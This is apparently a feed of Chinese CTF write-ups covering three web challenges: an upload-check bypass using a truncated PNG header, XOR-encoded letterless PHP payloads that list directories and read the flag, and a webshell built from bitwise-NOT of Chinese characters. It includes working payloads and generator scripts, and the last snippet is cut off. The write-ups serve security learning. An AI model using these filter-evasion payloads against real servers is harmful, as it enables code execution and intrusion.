aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="解析"><a href="#解析" class="headerlink" title="解析"></a>解析</h3><p>在这拿flag</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-HarekazeCTF2019-Avatar-Uploader-1/image-20210816143639267.png"></p><p>重点是绕过这里</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-HarekazeCTF2019-Avatar-Uploader-1/image-20210816165109112.png"></p><blockquote><p><code>finfo_file()</code>主要是识别<strong>PNG</strong>文件十六进制下的第一行信息，若保留文件头信息，破坏掉文件长宽等其余信息，也就可以绕过<code>getimagesize()</code>函数的检验</p></blockquote><p>随便找个图片，删掉多余的东西</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-HarekazeCTF2019-Avatar-Uploader-1/image-20210816165632093.png"></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-HarekazeCTF2019-Avatar-Uploader-1/image-20210816165924125.png"></p><p>上传一下，结束。</p><p>测试了下，就第一行，一个字符都不能多，多了就会变成<code>octet-stream</code></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-HarekazeCTF2019-Avatar-Uploader-1/image-20210816173818763.png"></p><p>弄本地环境的时候，谷歌浏览器不知道抽什么风，明明设置好了hosts，一会可以，一会有跳转到莫名其妙的网站，隐声模式有没问题，火狐，phpstorm，edge也可以。换了个网址，得，开始隐私错误，越来越想放弃chrome了。</p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>刷题笔记:[ISITDTU 2019]EasyPHP</title>
      <link href="/p/2441275844.html"/>
      <url>/p/2441275844.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$_</span> <span class="token operator">=</span> @<span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'_'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[\x00- 0-9\'"`$&amp;.,|[&#123;_defgops\x7F]+/i'</span><span class="token punctuation">,</span> <span class="token variable">$_</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'rosé will not do it'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token function">count_chars</span><span class="token punctuation">(</span><span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$_</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0x3</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0xd</span> <span class="token punctuation">)</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'you are so close, omg'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><blockquote><p>count_chars(string,3) 返回一个去重的字符串(所有使用过的不同的字符)</p></blockquote><p>要求所用字符小于13种，还检测各种字符。</p><p>明显，就是无字母数字webshell的构造。</p><p>先测试下phpinfo()</p><pre class="line-numbers language-none"><code class="language-none">?_&#x3D;(~%8F%97%8F%96%91%99%90)();或?_&#x3D;(%80%80%80%80%80%80%80^%f0%e8%f0%e9%ee%e6%ef)();<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-ISITDTU-2019-EasyPHP/image-20210815190330822.png"></p><p>命令执行的几个函数都被禁用了，就得想其他办法。</p><p>可以构造</p><pre class="line-numbers language-none"><code class="language-none">print_r(scandir(.));%ff%ff%ff%ff%ff%ff%ff^%8f%8d%96%91%8b%a0%8d(%ff%ff%ff%ff%ff%ff%ff^%8c%9c%9e%91%9b%96%8d(%ff^%d1));<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>但问题在于，限制了13个字符，除去必要的<code>()^;</code>，只剩下9个字符了。</p><p>方便后续使用方便，还是写个脚本吧</p><p>姑且写了个暴力生成的，但要跑很久的代码，无奈放弃。</p><p>突然发现，在这里统计的字符串并非urlcode的字符串，比如<code>#</code>对应<code>%23</code>，传过去统计的是<code>#</code>，之前搞错了，代码怎么写都不对，浪费了很多时间，无语了。</p><p>那换种思路，因为限制种类数不限制长度，尝试有没有哪个字符可以通过其他字符进行多次异或得到，这样的话就好办了，百度了下脚本改了改。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">en</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token number">0xff</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span>p <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span><span class="token builtin">set</span><span class="token punctuation">(</span><span class="token string">'printrscandir'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> p<span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> p<span class="token punctuation">:</span>        <span class="token keyword">for</span> k <span class="token keyword">in</span> p<span class="token punctuation">:</span>            <span class="token keyword">for</span> m <span class="token keyword">in</span> p<span class="token punctuation">:</span>                <span class="token keyword">if</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>k<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">:</span>                    <span class="token keyword">if</span><span class="token punctuation">(</span>j <span class="token operator">==</span> k <span class="token keyword">or</span> j <span class="token operator">==</span> m <span class="token keyword">or</span> m <span class="token operator">==</span> k<span class="token punctuation">)</span><span class="token punctuation">:</span>                        <span class="token keyword">continue</span>                    <span class="token keyword">else</span><span class="token punctuation">:</span>                        <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token operator">+</span><span class="token string">'=='</span><span class="token operator">+</span>j <span class="token operator">+</span> <span class="token string">'^'</span> <span class="token operator">+</span> k <span class="token operator">+</span> <span class="token string">'^'</span><span class="token operator">+</span>m<span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">'\t'</span><span class="token punctuation">)</span>                        <span class="token keyword">print</span><span class="token punctuation">(</span>                            <span class="token string">'&#123;:0>2&#125;  =>  ["&#123;:0>2&#125;","&#123;:0>2&#125;","&#123;:0>2&#125;"]'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>                                en<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">,</span> en<span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">,</span> en<span class="token punctuation">(</span>k<span class="token punctuation">)</span><span class="token punctuation">,</span> en<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                        <span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-ISITDTU-2019-EasyPHP/image-20210815235405221.png"></p><p>挑些出现次数较少的字符替换一下，比如</p><p>原来是t，我选<code>t==s^d^c     %8b  =&gt;  %8c  %9b  %9c</code></p><pre class="line-numbers language-none"><code class="language-none">(%8b)^(%ff)变成(%8c)^(%ff)^(%9b)^(9c)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>半自动替换脚本：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">tail</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>    s <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span><span class="token builtin">filter</span><span class="token punctuation">(</span><span class="token boolean">None</span><span class="token punctuation">,</span> s<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'^'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token string">'()'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'%'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    p <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'ff'</span><span class="token punctuation">]</span><span class="token operator">*</span><span class="token builtin">len</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token punctuation">[</span>p<span class="token punctuation">,</span> p<span class="token punctuation">]</span><span class="token keyword">def</span> <span class="token function">head</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>    s <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span><span class="token builtin">filter</span><span class="token punctuation">(</span><span class="token boolean">None</span><span class="token punctuation">,</span> s<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'^'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token string">'()'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'%'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> s<span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>l<span class="token punctuation">)</span><span class="token punctuation">:</span>    s <span class="token operator">=</span> <span class="token string">''</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> l<span class="token punctuation">:</span>        s <span class="token operator">+=</span> <span class="token string">'%'</span><span class="token operator">+</span>i    <span class="token keyword">return</span> ss <span class="token operator">=</span> <span class="token string">'(%8f%8d%96%91%8b%a0%8d)^(%ff%ff%ff%ff%ff%ff%ff)'</span>l <span class="token operator">=</span> head<span class="token punctuation">(</span>s<span class="token punctuation">)</span>p <span class="token operator">=</span> tail<span class="token punctuation">(</span>s<span class="token punctuation">)</span>to_fix_list <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'8b'</span><span class="token punctuation">,</span> <span class="token string">'91'</span><span class="token punctuation">,</span> <span class="token string">'8d'</span><span class="token punctuation">]</span>to_replace <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token string">"8c"</span><span class="token punctuation">,</span> <span class="token string">"9b"</span><span class="token punctuation">,</span> <span class="token string">"9c"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">"96"</span><span class="token punctuation">,</span> <span class="token string">"9c"</span><span class="token punctuation">,</span> <span class="token string">"9b"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">"9e"</span><span class="token punctuation">,</span> <span class="token string">"9c"</span><span class="token punctuation">,</span> <span class="token string">"8f"</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token keyword">for</span> t<span class="token punctuation">,</span> to_fix <span class="token keyword">in</span> <span class="token builtin">enumerate</span><span class="token punctuation">(</span>to_fix_list<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> n<span class="token punctuation">,</span> i <span class="token keyword">in</span> <span class="token builtin">enumerate</span><span class="token punctuation">(</span>l<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> to_fix <span class="token operator">==</span> i<span class="token punctuation">:</span>            s <span class="token operator">=</span> s<span class="token punctuation">.</span>replace<span class="token punctuation">(</span>to_fix<span class="token punctuation">,</span> to_replace<span class="token punctuation">[</span>t<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span>            p<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span>n<span class="token punctuation">]</span> <span class="token operator">=</span> to_replace<span class="token punctuation">[</span>t<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>            p<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>n<span class="token punctuation">]</span> <span class="token operator">=</span> to_replace<span class="token punctuation">[</span>t<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"&#123;&#125;^(&#123;&#125;)^(&#123;&#125;)"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> add<span class="token punctuation">(</span>p<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> add<span class="token punctuation">(</span>p<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>至于为什么要用三个字符异或，因为两个字符异或出来的结果很少甚至没有。</p><pre class="line-numbers language-none"><code class="language-none">print_r&#x3D;((%8f%9e%96%96%8c%a0%9e)^(%ff%ff%ff%ff%ff%ff%ff)^(%ff%9c%ff%9c%9c%ff%9c)^(%ff%8f%ff%9b%9b%ff%8f))scandir&#x3D;((%ff%ff%ff%ff%ff%ff%ff)^(%8c%9c%9e%96%9b%96%9e)^(%ff%ff%ff%9c%ff%ff%9c)^(%ff%ff%ff%9b%ff%ff%8f))<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>读目录payload</p><pre class="line-numbers language-none"><code class="language-none">?_&#x3D;((%8f%9e%96%96%8c%a0%9e)^(%ff%ff%ff%ff%ff%ff%ff)^(%ff%9c%ff%9c%9c%ff%9c)^(%ff%8f%ff%9b%9b%ff%8f))(((%ff%ff%ff%ff%ff%ff%ff)^(%8c%9c%9e%96%9b%96%9e)^(%ff%ff%ff%9c%ff%ff%9c)^(%ff%ff%ff%9b%ff%ff%8f))((%d1)^(%ff)));<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-ISITDTU-2019-EasyPHP/image-20210815225505661.png"></p><p>读flag，用<code>end()</code>代替数组选择。</p><pre class="line-numbers language-none"><code class="language-none">show_source(end(scandir(.)));<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">?_&#x3D;((%8d%9c%97%a0%88%8d%97%8d%9c%a0%a0)^(%9a%97%9b%88%a0%9a%9b%9b%8d%9c%9a)^(%9b%9c%9c%a0%88%9b%9c%9c%9c%a0%a0)^(%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff))(((%a0%97%8d)^(%9a%9a%9b)^(%a0%9c%8d)^(%ff%ff%ff))(((%8d%a0%88%97%8d%9b%9c)^(%9a%9c%8d%9a%9b%9a%8d)^(%9b%a0%9b%9c%8d%97%9c)^(%ff%ff%ff%ff%ff%ff%ff))(%d1^%ff)));<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> PHP代码审计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>刷题笔记:[SUCTF 2018]GetShell</title>
      <link href="/p/1142081591.html"/>
      <url>/p/1142081591.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>关键字:[无字母数字webshell]</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-SUCTF-2018-GetShell/image-20210814171538120.png"></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-SUCTF-2018-GetShell/image-20210814171625633.png"></p><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p>开局index.php?act=upload</p><p>还给出源码，先试试文件包含。</p><p>不太行。</p><p>随便上传了个空jpg文件，直接变成php，好活</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-SUCTF-2018-GetShell/image-20210814180946756.png"></p><p>基本把数字，字母全过滤了，<code>|^%</code>也过滤了</p><p>试了下<code>()~</code>没被过滤，但<code>%</code>被过滤了就没法用平时用的那种办法了。</p><p>咋办呢？可以利用中文。</p><p>先构造出<code>1</code></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$__</span><span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$____</span><span class="token operator">=</span><span class="token variable">$__</span><span class="token operator">==</span><span class="token variable">$__</span><span class="token punctuation">;</span><span class="token comment">//$__等于$__,返回True则$____为1</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>然后生成下</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">//用于生成无字母数字webshell</span><span class="token comment">//echo ~('北')[1] =>s</span><span class="token comment">//用法?a=xxxx</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Content-Type: text/html; charset=utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'当我站在山顶上俯瞰半个鼓浪屿和整个厦门的夜空的时候，我知道此次出行的目的已经完成了，我要开始收拾行李，明天早上离开这里。前几天有人问我，大学四年结束了，你也不说点什么？乌云发生了一些事情，所有人都缄默不言，你也是一样吗？你逃到南方，难道不回家了吗？当然要回家，我只是想找到我要找的答案。其实这次出来一趟很累，晚上几乎是热汗淋漓回到住处，厦门的海风伴着妮妲路过后带来的淅淅沥沥的小雨，也去不走我身上任何一个毛孔里的热气。好在旅社的生活用品一应俱全，洗完澡后我爬到屋顶。旅社是一个老别墅，说起来也不算老，比起隔壁一家旧中国时期的房子要豪华得多，竖立在笔山顶上与厦门岛隔海相望。站在屋顶向下看，灯火阑珊的鼓浪屿街市参杂在绿树与楼宇间，依稀还可以看到熙熙攘攘的游客。大概是夜晚渐深的缘故，周围慢慢变得宁静下来，我忘记白天在奔波什么，直到站在这里的时候，我才知道我寻找的答案并不在南方。当然也不在北方，北京的很多东西让我非常丧气，包括自掘坟墓的中介和颐指气使的大人们；北京也有很多东西让我喜欢，我喜欢颐和园古色古香的玉澜堂，我喜欢朝阳门那块“永延帝祚”的牌坊，喜欢北京鳞次栉比的老宅子和南锣鼓巷的小吃。但这些都不是我要的答案，我也不知道我追随的是什么，但想想百年后留下的又是什么，想想就很可怕。我曾经为了吃一碗臭豆腐，坐着优步从上地到北海北，兴冲冲地来到那个垂涎已久的豆腐摊前，用急切又害羞的口吻对老板说，来两份量的臭豆腐。其实也只要10块钱，吃完以后便是无与伦比的满足感。我记得那是毕业设计审核前夕的一个午后，五月的北京还不算炎热，和煦的阳光顺着路边老房子的屋檐洒向大地，但我还是不敢站在阳光下，春天的燥热难耐也绝不输给夏天。就像很多人冷嘲热讽的那样，做这一行谁敢把自己完全曝光，甭管你是黑帽子白帽子还是绿帽子。生活在那个时候还算美好，我依旧是一个学生，几天前辞别的同伴还在朝九晚五的工作，一切都照旧运行，波澜不远走千里吃豆腐这种理想主义的事情这几年在我身上屡屡发生，甚至南下此行也不例外。一年前的这个时候我许过一个心愿，在南普陀，我特为此来还愿。理想化、单纯与恋旧，其中单纯可不是一个多么令人称赞的形容，很多人把他和傻挂钩。“你太单纯了，你还想着这一切会好起来”，对呀，在男欢女爱那些事情上，我可不单纯，但有些能让人变得圆滑与世故的抉择中，我宁愿想的更单纯一些。去年冬天孤身一人来到北京，放弃了在腾讯做一个安逸的实习生的机会，原因有很多也很难说。在腾讯短暂的实习生活让我记忆犹新，我感觉这辈子不会再像一个小孩一样被所有人宠了，这些当我选择北漂的时候应该就要想到的。北京的冬天刺骨的寒冷，特别是2015年的腊月，有几天连续下着暴雪，路上的积雪一踩半步深，咯吱咯吱响，周遭却静的像深山里的古刹。我住的小区离公司有一段距离，才下雪的那天我甚至还走着回家。北京的冬天最可怕的是寒风，走到家里耳朵已经硬邦邦好像一碰就会碎，在我一头扎进被窝里的时候，我却慢慢喜欢上这个古都了。我想到《雍正皇帝》里胤禛在北京的鹅毛大雪里放出十三爷，那个拼命十三郎带着令牌取下丰台大营的兵权，保了大清江山盛世的延续与稳固。那一夜，北京的漫天大雪绝不逊于今日，而昔人已作古，来者尚不能及，多么悲哀。这个古都承载着太多历史的厚重感，特别是下雪的季节，我可以想到乾清宫前广场上千百年寂寞的雕龙与铜龟，屋檐上的积雪，高高在上的鸱吻，想到数百年的沧桑与朝代更迭。雪停的那天我去了颐和园，我记得我等了很久才摇摇摆摆来了一辆公交车，车上几乎没有人，司机小心翼翼地转动着方向盘，在湿滑的道路上缓慢前行。窗外白茫茫一片，阳光照在雪地上有些刺眼，我才低下头。颐和园的学生票甚至比地铁票还便宜。在昆明湖畔眺望湖面，微微泛着夕阳霞光的湖水尚未结冰，踩着那些可能被御碾轧过的土地，滑了无数跤，最后只能扶着湖边的石狮子叹气，为什么没穿防滑的鞋子。昆明湖这一汪清水，见证了光绪皇帝被囚禁十载的蹉跎岁月，见证了静安先生誓为先朝而自溺，也见证了共和国以来固守与开放的交叠。说起来，家里有本卫琪著的《人间词话典评》，本想买来瞻仰一下王静安的这篇古典美学巨著，没想到全书多是以批判为主。我自诩想当文人的黑客，其实也只是嘴里说说，真到评说文章是非的时候，我却张口无词。倒是誓死不去发，这点确实让我无限感慨：中国士大夫的骨气，真的是从屈原投水的那一刻就奠定下来的。有句话说，古往今来中国三大天才死于水，其一屈原，其二李白，其三王国维。卫琪对此话颇有不服，不纠结王国维是否能够与前二者相提并论，我单喜欢他的直白，能畅快评说古今词话的人，也许无出其右了吧。人言可畏、人言可畏，越到现代越会深深感觉到这句话的正确，看到很多事情的发展往往被舆论所左右，就越羡慕那些无所畏惧的人，不论他们是勇敢还是自负。此间人王垠算一个，网络上人们对他毁誉参半，但确实有本事而又不矫揉做作，放胆直言心比天高的只有他一个了。那天在昆明湖畔看过夕阳，直到天空变的无比深邃，我才慢慢往家的方向走。耳机放着后弦的《昆明湖》，不知不觉已经十年了，不知道这时候他有没有回首望望自己的九公主和安娜，是否还能够“泼墨造一匹快马，追回十年前姑娘”。后来，感觉一切都步入正轨，学位证也顺利拿到，我匆匆告别了自己的大学。后来也遇到了很多事，事后有人找我，很多人关心你，少数人可能不是，但出了学校以后，又有多少人和事情完全没有目的呢？我也考虑了很多去处，但一直没有决断，倒有念怀旧主，也有妄自菲薄之意，我希望自己能做出点成绩再去谈其他的，所以很久都是闭门不出，琢磨东西。来到厦门，我还了一个愿，又许了新的愿望，希望我还会再次来还愿。我又来到了上次没住够的鼓浪屿，订了一间安静的房子，只有我一个人。在这里，能听到的只有远处屋檐下鸟儿叽叽喳喳的鸣叫声，远处的喧嚣早已烟消云散，即使这只是暂时的。站在屋顶的我，喝下杯中最后一口水。清晨，背着行李，我乘轮渡离开了鼓浪屿，这是我第二次来鼓浪屿，谁知道会不会是最后一次。我在这里住了三天，用三天去寻找了一个答案。不知不觉我又想到辜鸿铭与沈子培的那段对话。“大难临头，何以为之？”“世受国恩，死生系之。”'</span><span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">&lt;</span><span class="token function">mb_strlen</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$st</span> <span class="token operator">=</span> <span class="token function">mb_substr</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">,</span> <span class="token variable">$i</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token operator">~</span><span class="token punctuation">(</span><span class="token variable">$st</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token variable">$a</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">#取汉字的第一位</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token operator">==</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment">#$_GET['a']想要得到的字符</span><span class="token punctuation">&#123;</span><span class="token keyword">echo</span> <span class="token variable">$st</span><span class="token punctuation">;</span><span class="token keyword">exit</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>示例：</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F;$____&#x3D;1echo ~茉[$____];&#x2F;&#x2F;secho ~内[$____];&#x2F;&#x2F;yecho ~茉[$____];&#x2F;&#x2F;secho ~苏[$____];&#x2F;&#x2F;techo ~的[$____];&#x2F;&#x2F;eecho ~咩[$____];&#x2F;&#x2F;mecho ~课[$____];&#x2F;&#x2F;Pecho ~尬[$____];&#x2F;&#x2F;Oecho ~笔[$____];&#x2F;&#x2F;Secho ~端[$____];&#x2F;&#x2F;Techo ~瞎[$____];&#x2F;&#x2F;a<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$____</span><span class="token operator">=</span><span class="token variable">$__</span><span class="token operator">==</span><span class="token variable">$__</span><span class="token punctuation">;</span><span class="token comment">#1</span><span class="token variable">$_</span><span class="token operator">=</span><span class="token operator">~</span><span class="token punctuation">(</span>北<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token variable">$____</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$_</span><span class="token operator">.=</span><span class="token operator">~</span><span class="token punctuation">(</span>熙<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token variable">$____</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$_</span><span class="token operator">.=</span><span class="token operator">~</span><span class="token punctuation">(</span>北<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token variable">$____</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$_</span><span class="token operator">.=</span><span class="token operator">~</span><span class="token punctuation">(</span>拾<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token variable">$____</span><span class="token punctuation">]</span><span class="token 